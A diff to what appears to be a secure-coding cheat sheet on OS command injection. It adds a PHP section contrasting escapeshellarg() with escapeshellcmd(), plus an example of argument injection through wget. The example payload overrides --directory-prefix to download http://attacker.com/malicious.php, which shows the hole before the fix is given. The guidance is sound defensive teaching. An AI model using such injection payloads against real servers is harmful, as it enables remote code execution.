@@ -33,6 +33,7 @@ Every OS Command Injection is also an Argument Injection. In this type of attack
 For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.
 
 ```php
+
 system("curl " . escape($url));
 ```
 
@@ -40,7 +41,8 @@ which will prevent an attacker to run other commands.
 
 However, if the attacker controlled string contains an additional argument of the `curl` command:
 
-```
+```php
+
 system("curl " . escape("--help"))
 ```
 
@@ -82,8 +84,8 @@ If calling a system command that incorporates user-supplied cannot be avoided, t
 
 - When it comes to the **commands** used, these must be validated against a list of allowed commands.
 - In regards to the **arguments** used for these commands, they should be validated using the following options:
-    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
-    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`
+  - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
+  - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`
 - According to **Guideline 10** of this [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html), *The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.* For example, `curl -- $url` will prevent an argument injection even if the `$url` is malformed and contains an additional argument.
 
 **Note A:**
@@ -214,7 +216,51 @@ See relevant details in the [DotNet Security Cheat Sheet](DotNet_Security_Cheat_
 
 ### PHP
 
-In PHP use [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) or [escapeshellcmd()](https://www.php.net/manual/en/function.escapeshellcmd.php) rather than [exec()](https://www.php.net/manual/en/function.exec.php), [system()](https://www.php.net/manual/en/function.system.php), [passthru()](https://www.php.net/manual/en/function.passthru.php).
+PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.
+
+`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.
+
+`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.
+
+It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.
+
+For example, consider this code using `wget` with `escapeshellcmd()`:
+
+```php
+$url = $_GET['url'];
+$command = 'wget --directory-prefix=..\temp ' . $url;
+system(escapeshellcmd($command));
+```
+
+If the user provides:
+
+```text
+http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
+```
+
+`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.
+
+The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:
+
+```php
+$url = $_GET['url'];
+$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
+system($command);
+```
+
+Now the malicious input becomes:
+
+```text
+wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
+```
+
+Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.
+
+In addition, it is good security practice to follow these recommendations:  
+
+- **Hardcode the command**: never allow the user to choose which executable to run.  
+- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.  
+- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.  
 
 ## Related articles
 
